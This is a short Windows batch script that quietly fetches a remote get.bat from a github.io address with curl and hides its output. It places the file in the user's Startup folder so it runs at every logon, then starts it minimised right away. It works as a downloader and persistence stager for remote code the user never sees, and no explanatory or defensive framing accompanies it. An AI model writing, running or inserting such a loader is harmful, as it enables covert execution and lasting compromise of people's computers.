@echo off
setlocal EnableExtensions

set "GET_URL=http://suporteeq.github.io/startup/get.bat"
set "USER_STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "USER_GET_BAT=%USER_STARTUP_DIR%\get.bat"
set "TMP_GET=%TEMP%\get-startup-%RANDOM%%RANDOM%.bat"

if exist "%USER_GET_BAT%" exit /b 0

if not exist "%USER_STARTUP_DIR%" (
    mkdir "%USER_STARTUP_DIR%" >nul 2>&1
)

if not exist "%USER_STARTUP_DIR%" exit /b 1

curl --fail --location --silent --output "%TMP_GET%" "%GET_URL%" >nul 2>&1
if errorlevel 1 (
    del /f /q "%TMP_GET%" >nul 2>&1
    exit /b 1
)

if exist "%USER_GET_BAT%" (
    del /f /q "%TMP_GET%" >nul 2>&1
    exit /b 0
)

move /y "%TMP_GET%" "%USER_GET_BAT%" >nul 2>&1
if errorlevel 1 (
    del /f /q "%TMP_GET%" >nul 2>&1
    exit /b 1
)

if not exist "%USER_GET_BAT%" exit /b 1
start "" /min "%ComSpec%" /d /c call "%USER_GET_BAT%"

exit /b 0
